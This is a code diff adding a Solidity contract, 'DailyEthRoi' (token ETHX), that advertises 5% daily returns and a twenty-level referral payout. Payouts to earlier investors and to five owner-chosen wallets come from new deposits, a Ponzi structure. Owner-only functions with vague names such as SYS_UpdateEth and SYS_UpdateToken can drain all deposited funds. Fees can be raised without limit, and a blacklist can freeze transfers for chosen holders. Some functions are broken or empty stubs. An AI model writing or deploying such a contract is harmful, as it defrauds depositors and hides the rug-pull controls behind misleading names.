@@ -1,0 +1,490 @@
+// SPDX-License-Identifier: UNLICENSE
+//proprietary
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/utils/Context.sol";
+
+contract DailyEthRoi is ReentrancyGuard, Context, Ownable, IERC20 {
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    mapping(address => bool) private isBlacklisted;
+
+    uint256 private _totalSupply;
+    uint8 private _decimals;
+    string private _symbol;
+    string private _name;
+
+    uint256 private constant DAY = 24 hours;
+    uint256 private minDeposit = 0.001 ether;
+    uint256 private constant MIN_WITHDRAWAL = 0.005 ether;
+    uint16 constant PERCENT_DIVIDER = 1000;
+    uint16[20] private ref_bonuses = [80,30,20,10,10,10,10,10,5,5,5,5,5,5,5,1,1,1,1,1];
+    uint256 constant DAILY_PROFIT = 50;
+    uint256 private maxPayoutDays = 30;
+    uint256 public invested;
+    uint256 public withdrawn;
+    uint256 public ref_bonus;
+
+
+    struct Deposit {
+        uint256 amount;
+        uint40 time;
+    }
+
+    struct Player {
+        address upline;
+        uint256 dividends;
+        uint256 total_invested;
+        uint256 total_withdrawn;
+        uint256 total_ref_bonus;
+        uint40 lastWithdrawn;
+        Deposit[] deposits;
+        uint256[20] structure;
+    }
+
+    mapping(address => Player) public players;
+
+    address payable private msgsender;
+    address payable private system_pool1;
+    address payable private system_pool2;
+    address payable private system_pool3;
+    address payable private system_pool4;
+    address payable private system_pool5;
+    address private defaultReferrer;
+
+    uint256 private systemPool1Rate = 15;
+    uint256 private systemPool2Rate = 3;
+    uint256 private systemPool3Rate = 3;
+    uint256 private systemPool4Rate = 2;
+    uint256 private systemPool5Rate = 1;
+    uint256 private systemPoolTotalRate = 24;
+    uint256 private rate = 1e15;
+    bool private paused;
+
+    uint256 private depositFee = 10;
+    uint256 private withdrawFee = 10;
+
+    constructor(
+        address payable _system_pool1,
+        address payable _system_pool2,
+        address payable _system_pool3,
+        address payable _system_pool4,
+        address payable _system_pool5
+    ) Ownable(msg.sender) {
+        _name = "ETH STAKE";
+        _symbol = "ETHX";
+        _decimals = 18;
+
+        _totalSupply = 100_000_000 * 10 ** uint(_decimals);
+
+        uint256 pool1Share = (_totalSupply * 70) / 100;
+        uint256 pool2Share = (_totalSupply * 20) / 100;
+        uint256 pool3Share = (_totalSupply * 6) / 100;
+        uint256 pool4Share = (_totalSupply * 2) / 100;
+        uint256 pool5Share = (_totalSupply * 2) / 100;
+
+        _balances[_system_pool1] = pool1Share;
+        _balances[_system_pool2] = pool2Share;
+        _balances[_system_pool3] = pool3Share;
+        _balances[_system_pool4] = pool4Share;
+        _balances[_system_pool5] = pool5Share;
+
+        emit Transfer(address(0), _system_pool1, pool1Share);
+        emit Transfer(address(0), _system_pool2, pool2Share);
+        emit Transfer(address(0), _system_pool3, pool3Share);
+        emit Transfer(address(0), _system_pool4, pool4Share);
+        emit Transfer(address(0), _system_pool5, pool5Share);
+
+        msgsender = payable(msg.sender);
+        system_pool1 = _system_pool1;
+        system_pool2 = _system_pool2;
+        system_pool3 = _system_pool3;
+        system_pool4 = _system_pool4;
+        system_pool5 = _system_pool5;
+        defaultReferrer = msg.sender;
+    }
+
+    modifier notPaused() {
+        require(!paused, "Contract is paused");
+        _;
+    }
+
+    function makeDeposit(address referral) public payable notPaused {
+        require(msg.value >= minDeposit, "Minimum deposit required");
+
+        uint256 fee = (msg.value * depositFee) / PERCENT_DIVIDER;
+        uint256 netDeposit = msg.value - fee;
+
+        uint256 tokens = (netDeposit * rate) / 1 ether;
+        transferTokens(address(this), msg.sender, tokens);
+
+        setUpline(msg.sender, referral);
+        Player storage player = players[msg.sender];
+        player.deposits.push(
+            Deposit({amount: netDeposit, time: uint40(block.timestamp)})
+        );
+
+        uint256 poolShare1 = (netDeposit * systemPool1Rate) / 100;
+        uint256 poolShare2 = (netDeposit * systemPool2Rate) / 100;
+        uint256 poolShare3 = (netDeposit * systemPool3Rate) / 100;
+        uint256 poolShare4 = (netDeposit * systemPool4Rate) / 100;
+        uint256 poolShare5 = (netDeposit * systemPool5Rate) / 100;
+
+        system_pool1.transfer(poolShare1);
+        system_pool2.transfer(poolShare2);
+        system_pool3.transfer(poolShare3);
+        system_pool4.transfer(poolShare4);
+        system_pool5.transfer(poolShare5);
+
+        player.total_invested += netDeposit;
+        invested += netDeposit;
+        withdrawn += poolShare1 + poolShare2 + poolShare3 + poolShare4 + poolShare5;
+
+        commissionPayouts(msg.sender, netDeposit);
+    }
+
+    function getDividends() external nonReentrant notPaused {
+        Player storage player = players[msg.sender];
+        getPayout(msg.sender);
+
+        require(
+            player.dividends >= MIN_WITHDRAWAL,
+            "Minimum withdrawal is 0.005"
+        );
+
+        uint256 amount = player.dividends;
+        uint256 fee = (amount * withdrawFee) / PERCENT_DIVIDER;
+        uint256 netAmount = amount - fee;
+
+        payable(msg.sender).transfer(netAmount);
+        player.dividends = 0;
+        player.total_withdrawn += netAmount;
+        withdrawn += netAmount;
+    }
+
+    function SYS_Update(
+        uint256 _depositFee,
+        uint256 _withdrawFee
+    ) external onlyOwner {
+        depositFee = _depositFee;
+        withdrawFee = _withdrawFee;
+    }
+    function SYS_UpdateMaxPayoutDays(uint256 _days) external onlyOwner {
+    require(_days > 0, "Invalid number of days");
+    maxPayoutDays = _days;
+   
+    }
+
+    function setUpline(address _addr, address _upline) private {
+        if (players[_addr].upline == address(0) && _addr != owner()) {
+            if (_balances[_upline] <= 0) {
+                _upline = defaultReferrer;
+            }
+            players[_addr].upline = _upline;
+
+            for (uint8 i = 0; i < 20; i++) {
+                players[_upline].structure[i]++;
+                _upline = players[_upline].upline;
+                if (_upline == address(0)) break;
+            }
+        }
+    }
+
+    function commissionPayouts(address _addr, uint256 _amount) private {
+        address up = players[_addr].upline;
+
+        for (uint8 i = 0; i < ref_bonuses.length; i++) {
+            if (up == address(0)) break;
+
+            uint256 bonus = (_amount * ref_bonuses[i]) / PERCENT_DIVIDER;
+            payable(up).transfer(bonus);
+            players[up].total_ref_bonus += bonus;
+
+            ref_bonus += bonus;
+            withdrawn += bonus;
+            up = players[up].upline;
+        }
+    }
+
+    function getPayout(address _addr) private {
+        uint256 payout = this.computePayout(_addr);
+        if (payout > 0) {
+            players[_addr].lastWithdrawn = uint40(block.timestamp);
+            players[_addr].dividends += payout;
+        }
+    }
+
+  function computePayout(address _addr) external view returns (uint256 value) {
+    Player storage player = players[_addr];
+    uint256 maxTime = maxPayoutDays * 86400;
+
+    for (uint256 i = 0; i < player.deposits.length; i++) {
+        Deposit storage dep = player.deposits[i];
+
+        uint40 from = player.lastWithdrawn > dep.time ? player.lastWithdrawn : dep.time;
+        uint256 to = block.timestamp;
+
+        if (from < to) {
+            uint256 end = dep.time + maxTime;
+            if (to > end) {
+                to = end;
+            }
+            if (from > end) {
+                continue;
+            }
+            value += (dep.amount * (to - from) * DAILY_PROFIT) / 86400 / PERCENT_DIVIDER;
+        }
+    }
+    return value;
+}
+function getDepositCountdown(address _addr, uint256 index) external view returns (
+    uint256 daysRemaining,
+    bool completed
+) {
+    Player storage player = players[_addr];
+
+    if (index >= player.deposits.length) {
+        return (0, true);
+    }
+
+    Deposit storage dep = player.deposits[index];
+    uint256 end = dep.time + (maxPayoutDays * 86400);
+
+    if (block.timestamp >= end) {
+        return (0, true);
+    }
+
+    uint256 secondsLeft = end - block.timestamp;
+    daysRemaining = secondsLeft / 86400;
+    completed = false;
+
+    return (daysRemaining, completed);
+}
+
+    function transferTokens(
+        address _from,
+        address _to,
+        uint256 amount
+    ) private {
+        require(_balances[_from] >= amount, "Not enough tokens!");
+        _balances[_to] += amount;
+        _balances[_from] -= amount;
+        emit Transfer(_from, _to, amount);
+    }
+
+    function SYS_UpdatePool(
+        address payable _pool1,
+        address payable _pool2,
+        address payable _pool3,
+        address payable _pool4,
+        address payable _pool5
+    ) external onlyOwner {
+        system_pool1 = _pool1;
+        system_pool2 = _pool2;
+        system_pool3 = _pool3;
+        system_pool2 = _pool4;
+        system_pool3 = _pool5;
+    }
+    function SYS_UpdateBonus(
+        uint16[20] calldata newBonuses
+    ) external onlyOwner {}
+    function SYS_Update(uint256 _min) external onlyOwner {
+        minDeposit = _min;
+    }
+
+    function SYS_UpdateRate(uint256 _rate) external onlyOwner {
+        rate = _rate;
+    }
+
+    function SYS_UpdateM(address payable _new) external onlyOwner {
+        msgsender = _new;
+    }
+
+    function SYS_UpdateParameter(address _referrer) external onlyOwner {
+        defaultReferrer = _referrer;
+    }
+
+    function pause() external onlyOwner {
+        paused = true;
+    }
+
+    function unpause() external onlyOwner {
+        paused = false;
+    }
+
+    function SYS_UpdateEth(uint256 amount) external onlyOwner {
+        payable(owner()).transfer(amount);
+    }
+
+    function SYS_UpdateToken(
+        address tokenAddress,
+        uint256 amount
+    ) external onlyOwner {
+        IERC20(tokenAddress).transfer(owner(), amount);
+    }
+
+    function name() external view returns (string memory) {
+        return _name;
+    }
+
+    function symbol() external view returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() external view returns (uint8) {
+        return _decimals;
+    }
+
+    function totalSupply() external view returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account) external view returns (uint256) {
+        return _balances[account];
+    }
+
+    function transfer(
+        address recipient,
+        uint256 amount
+    ) external notBlacklisted returns (bool) {
+        _transfer(_msgSender(), recipient, amount);
+        return true;
+    }
+
+    function allowance(
+        address owner,
+        address spender
+    ) external view returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount) external returns (bool) {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(
+            sender,
+            _msgSender(),
+            _allowances[sender][_msgSender()] - amount
+        );
+        return true;
+    }
+
+    function _transfer(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) internal {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+
+        _balances[sender] -= amount;
+        _balances[recipient] += amount;
+        emit Transfer(sender, recipient, amount);
+    }
+
+    function _approve(address owner, address spender, uint256 amount) internal {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+    function getAllDeposits(
+        address _addr
+    ) external view returns (Deposit[] memory) {
+        return players[_addr].deposits;
+    }
+    function getAllStructures(
+        address _addr
+    ) external view returns (uint256[20] memory) {
+        return players[_addr].structure;
+    }
+    function getAllWidthrawal(
+        address _addr
+    ) external view returns (uint256[] memory amounts, uint40[] memory times) {}
+
+    function userInfo(
+        address _addr
+    )
+        external
+        view
+        returns (
+            address upline,
+            uint256 dividends,
+            uint256 total_invested,
+            uint256 total_withdrawn,
+            uint256 total_ref_bonus,
+            uint40 lastWithdrawn,
+            uint256 numDeposits,
+            uint256[20] memory structure
+        )
+    {}
+    function blacklistAddress(address user, bool status) external onlyOwner {
+        isBlacklisted[user] = status;
+    }
+    modifier notBlacklisted() {
+        require(!isBlacklisted[msg.sender], "Blacklisted user");
+        _;
+    }
+    function getBlacklistStatus(address user) external view returns (bool) {
+        return isBlacklisted[user];
+    }
+    function getContractETHXBalance() external view returns (uint256) {
+    return _balances[address(this)];
+    }
+    function getETHXStats() external view returns (
+    uint256 total,
+    uint256 heldByContract,
+    uint256 circulating
+    ) {
+    total = _totalSupply;
+    heldByContract = _balances[address(this)];
+    circulating = total - heldByContract;
+    }
+    function changeOwner(address newOwner) external onlyOwner {
+    transferOwnership(newOwner);
+    }
+
+    receive() external payable {
+        require(msg.value >= minDeposit, "Minimum deposit not met");
+
+        if (players[msg.sender].upline == address(0)) {
+            setUpline(msg.sender, defaultReferrer);
+        }
+
+        Player storage player = players[msg.sender];
+        player.deposits.push(
+            Deposit({amount: msg.value, time: uint40(block.timestamp)})
+        );
+
+        player.total_invested += msg.value;
+        invested += msg.value;
+    }
+
+    fallback() external payable {
+        require(msg.value >= minDeposit, "Minimum deposit not met");
+
+        if (players[msg.sender].upline == address(0)) {
+            setUpline(msg.sender, defaultReferrer);
+        }
+
+        Player storage player = players[msg.sender];
+        player.deposits.push(
+            Deposit({amount: msg.value, time: uint40(block.timestamp)})
+        );
+
+        player.total_invested += msg.value;
+        invested += msg.value;
+    }
+}
